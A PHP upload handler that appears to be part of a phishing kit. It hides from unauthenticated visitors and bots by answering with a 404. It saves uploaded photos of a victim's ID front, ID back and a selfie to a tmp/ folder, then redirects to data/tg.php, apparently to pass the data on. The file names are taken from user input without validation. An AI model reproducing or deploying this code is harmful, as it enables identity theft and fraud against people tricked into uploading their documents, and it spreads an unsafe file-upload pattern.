<?php

session_start();           
require_once '../session/Comp.php';
require_once '../session/auto.php';

$comps = new Comp;
$antibot = new Antibot;


if (!$comps->checkToken()) { 
echo $antibot->throw404();      
die();
}

$font = 'font.png'.str_replace(" ", "", basename($_FILES["file"]["name"]));
$back = 'back.png'.str_replace(" ", "", basename($_FILES["file"]["name"]));
$selfie = 'selfie.png'.str_replace(" ", "", basename($_FILES["file"]["name"]));

 if( $_POST['_upl'] == "Continue" ) {if(@copy($_FILES['photo-1']['tmp_name'], "tmp/" . $font)) { } else {  }}
 if( $_POST['_upl'] == "Continue" ) {if(@copy($_FILES['photo']['tmp_name'], "tmp/" . $back)) { } else {  }}
 if( $_POST['_upl'] == "Continue" ) {if(@copy($_FILES['photo3']['tmp_name'], "tmp/" . $selfie)) { } else {  }}


# Head Back To Next Step

header('Location: data/tg.php?token='.$_SESSION['token']); 

 ?>